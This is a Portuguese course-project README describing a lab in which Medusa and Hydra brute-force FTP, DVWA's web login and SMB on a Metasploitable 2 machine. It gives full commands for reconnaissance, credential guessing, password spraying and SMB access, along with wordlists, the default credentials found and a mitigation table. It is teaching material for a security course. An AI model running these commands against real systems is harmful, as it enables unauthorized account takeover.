# dio-brute-force-medusa-kali-desafio-1

# Simulação de Ataques de Força Bruta com Medusa e Kali Linux

Repositório criado para o desafio de projeto da formação em Cybersecurity da [Digital Innovation One (DIO)](https://www.dio.me/).

---

## Visão Geral do Projeto

Este projeto tem como objetivo demonstrar e documentar a simulação prática de ataques de quebra de senhas (*Brute Force* e *Password Spraying*) utilizando o **Kali Linux** e a ferramenta **Medusa**, tendo como alvos a máquina **Metasploitable 2** e a aplicação vulnerável **DVWA (Damn Vulnerable Web Application)**.

O projeto aborda tanto a perspectiva ofensiva (como os ataques ocorrem) quanto a defensiva (mecanismos de proteção e boas práticas corporativas).

---

## Topologia do Laboratório

* **Hypervisor:** Oracle VirtualBox
* **Tipo de Rede:** Rede Interna (*Host-Only Adapter*) — isolada do tráfego externo
* **Máquina Atacante:** Kali Linux (IP: `192.168.56.101`)
* **Máquina Alvo:** Metasploitable 2 com DVWA (IP: `192.168.56.102`)

---

## Ferramentas Utilizadas

* **Medusa:** Ferramenta modular, veloz e paralela para testes de força bruta via rede.
* **Nmap:** Varredura de portas e enumeração de versões de serviços.
* **Enum4linux:** Enumeração de dados e usuários via protocolo NetBIOS/SMB.
* **Smbclient:** Cliente de linha de comando para interação e validação de acessos SMB.
* **DVWA:** Aplicação web intencionalmente vulnerável para testes de segurança.

---

## 📝 Wordlists Utilizadas

Para os testes, foram criadas duas listas simples armazenadas na pasta `/wordlists`:

* `users.txt`:

  ```text
  admin
  root
  msfadmin
  user
  guest
  service
  ```

* `passwords.txt`:

  ```text
  123456
  password
  admin
  msfadmin
  toor
  qwerty
  12345678
  ```

---

## Cenários Práticos Executados

### Reconhecimento Prévio (Nmap)

Antes dos ataques, foi realizada a varredura para identificar as portas e serviços abertos no alvo:

```bash
nmap -sV -Pn 192.168.56.102
```

*Identificados: Porta 21 (FTP - vsftpd), Porta 80 (HTTP - Apache/DVWA) e Portas 139/445 (Samba SMB).*

---

### Cenário 1: Força Bruta no Serviço FTP

O protocolo FTP transmite credenciais em texto claro e é frequentemente alvo de ataques de dicionário quando desprovido de limites de tentativas.

**Comando executado:**

```bash
medusa -h 192.168.56.102 -U wordlists/users.txt -P wordlists/passwords.txt -M ftp -f -t 4
```

**Parâmetros explicados:**

* `-h 192.168.56.102`: IP da máquina vulnerável.
* `-U wordlists/users.txt`: Arquivo com a lista de usuários.
* `-P wordlists/passwords.txt`: Arquivo com a lista de senhas.
* `-M ftp`: Módulo de autenticação FTP.
* `-f`: Interrompe o ataque no primeiro par de credenciais válidas encontrado (*stop on first success*).
* `-t 4`: Define 4 threads simultâneas.

**Resultado:** Credencial válida encontrada: `msfadmin:msfadmin`.

---

### Cenário 2: Força Bruta em Formulário Web (DVWA)

O DVWA possui um módulo específico de teste de Brute Force via formulário HTTP GET/POST.

**Passos:**

1. Acesso à interface web: `http://192.168.56.102/dvwa/`.
2. Login inicial com credenciais padrão (`admin:password`) e ajuste da segurança para **Low**.
3. Navegação até a aba **Brute Force**.
4. Captura do Cookie de sessão e do caminho do formulário via navegador/DevTools.

**Comando executado no Medusa:**

```bash
medusa -h 192.168.56.102 -U wordlists/users.txt -P wordlists/passwords.txt -M http -m DIR:/dvwa/vulnerabilities/brute/ -m FORM:"index.php" -f
```

*Nota: Alternativamente, o Hydra ou Burp Suite Intruder podem ser combinados neste cenário para tratar cookies de sessão específicos:*

```bash
hydra -L wordlists/users.txt -P wordlists/passwords.txt 192.168.56.102 http-get-form "/dvwa/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:F=username and/or password incorrect:H=Cookie: PHPSESSID=valor_do_cookie; security=low"
```

**Resultado:** Credencial de administrador identificada no formulário web: `admin:password`.

---

### Cenário 3: Enumeração SMB e Password Spraying Corporativo

Em ambientes corporativos mal configurados, é comum que invasores primeiro enumerem nomes de contas legítimas e depois executem a técnica de **Password Spraying** (testar uma única senha provável em vários usuários para não estourar o limite de bloqueio de contas).

1. **Enumeração de Usuários com Enum4linux:**

   ```bash
   enum4linux -U 192.168.56.102
   ```

   *Foram enumerados os usuários do sistema Samba da máquina alvo.*

2. **Ataque de Password Spraying via Medusa (módulo `smbnt`):**

   ```bash
   medusa -h 192.168.56.102 -U wordlists/users.txt -p "msfadmin" -M smbnt
   ```

   *Note o uso do `-p` minúsculo (uma única senha testada contra a lista completa de usuários).*

3. **Validação do Acesso com `smbclient`:**
   Após encontrar a conta comprometida, foi realizada a listagem e conexão ao compartilhamento:

   ```bash
   smbclient -L //192.168.56.102 -U msfadmin
   smbclient //192.168.56.102/tmp -U msfadmin
   ```

---

## Medidas de Prevenção e Mitigação

Para mitigar os riscos demonstrados nos 3 cenários, as seguintes defesas devem ser aplicadas:

| Vulnerabilidade / Vetor | Ação de Mitigação |
| :--- | :--- |
| **Tentativas ilimitadas de login** | Implementar **Account Lockout Policy** (bloqueio temporário após 3 a 5 falhas consecutivas). |
| **Ataques automatizados / Bots** | Ativar **Rate Limiting** e CAPTCHA em formulários web e endpoints de login. |
| **Senhas fracas e previsíveis** | Forçar política de complexidade de senhas (tamanho mínimo de 12 a 16 caracteres, caracteres especiais, MFA obrigatório). |
| **Força bruta em FTP / SSH** | Utilizar ferramentas como o **Fail2ban** para bloquear IPs no firewall após múltiplas tentativas falhas; desativar autenticação por senha no SSH em favor de chaves públicas. |
| **Enumeração de dados em SMB** | Desabilitar sessões anônimas/nulas no Samba/Active Directory e desativar SMBv1. |
| **Detecção de Password Spraying** | Configurar regras de SIEM/SOC para alertar quando um mesmo endereço IP gerar falhas de autenticação em múltiplas contas distintas dentro de uma janela de tempo. |

---

## 📌 Conclusão

A prática permitiu comprovar a criticidade de políticas de autenticação robustas. Ferramentas como o **Medusa** demonstram a facilidade com que atacantes conseguem comprometer credenciais quando não há controles de taxa (*rate limiting*), bloqueio de contas ou autenticação em múltiplos fatores (MFA).

---
*Projeto desenvolvido para fins educacionais na plataforma DIO.*
